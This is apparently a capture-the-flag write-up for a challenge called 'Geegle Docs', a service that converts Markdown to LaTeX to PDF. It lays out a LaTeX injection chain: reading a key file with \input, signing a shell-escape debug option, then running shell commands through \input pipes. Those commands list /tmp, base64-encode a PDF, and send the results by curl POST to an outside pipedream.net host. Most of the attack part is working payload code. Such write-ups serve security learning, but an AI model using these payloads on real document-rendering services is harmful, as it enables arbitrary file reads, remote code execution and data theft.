# docs (Geegle Docs)

Markdown to LaTeX to PDF

Idea:
LaTeX injection

## Solution
1. Arbitrary file read
2. Read key
3. Sign shell-escape parameter
4. RCE
5. Read all files created by docs
6. Leak internal info

## Payload

First, get key:

```
\input{/key}
```

Then, sign dbgoption: `--shell-escape.TcRT24WdJHkdXSzP_dvugHoDF0E`

Then, RCE to list /tmp (with dbgoption)
```
\input{|"ls /tmp > /tmp/adamyi"}
\input{|"curl -X POST https://ennf359rgtoea.x.pipedream.net --data-urlencode @/tmp/adamyi"}
```

Find `/tmp/HOWDOIDELETETHIS.pdf`, get content (with dbgoption)
```
\input{|"base64 /tmp/HOWDOIDELETETHIS.pdf > /tmp/adamyi"}
\input{|"curl -X POST https://ennf359rgtoea.x.pipedream.net --data-urlencode @/tmp/adamyi"}
```

## author
adamyi
